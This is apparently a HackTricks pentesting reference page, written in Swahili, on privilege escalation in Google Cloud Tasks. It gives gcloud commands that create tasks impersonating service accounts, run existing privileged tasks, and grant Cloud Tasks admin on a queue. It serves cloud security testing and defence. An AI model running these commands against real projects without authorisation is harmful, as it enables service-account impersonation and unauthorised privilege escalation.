# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Mshambuliaji mwenye ruhusa hizi anaweza **kuiga akaunti nyingine za huduma** kwa kuunda tasks ambazo zinaendesha kwa utambulisho wa akaunti ya huduma iliyotajwa. Hii inaruhusu kutuma **authenticated HTTP requests to IAM-protected Cloud Run or Cloud Functions** services.

<details><summary>Create Cloud Task with service account impersonation</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Mshambuliaji mwenye ruhusa hizi anaweza **kuendesha task zilizopangwa zilizopo** bila kuwa na ruhusa kwenye service account inayohusishwa na task. Hii inaruhusu kutekeleza task ambazo zilianzishwa awali na service accounts zilizo na ruhusa za juu.

<details><summary>Endesha Cloud Task iliyopo bila ruhusa ya actAs</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Mhusika anayetekeleza amri hii **hahitaji ruhusa `iam.serviceAccounts.actAs`** kwenye akaunti ya huduma ya kazi. Hata hivyo, hili linamruhusu tu kuendesha kazi zilizopo â€” halimpa uwezo wa kuunda au kurekebisha kazi.

### `cloudtasks.queues.setIamPolicy`

Mshambuliaji mwenye ruhusa hii anaweza **kujipa au kumpa wahusika wengine majukumu ya Cloud Tasks** kwenye queues maalumu, na hivyo kuweza kupanua haki hadi `roles/cloudtasks.admin` ambayo inajumuisha uwezo wa kuunda na kuendesha kazi.

<details><summary>Kumpa jukumu la admin wa Cloud Tasks kwenye queue</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Hii inamruhusu mshambuliaji kumpa service account yoyote anayedhibiti ruhusa kamili za Cloud Tasks admin kwenye foleni.

## Marejeo

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
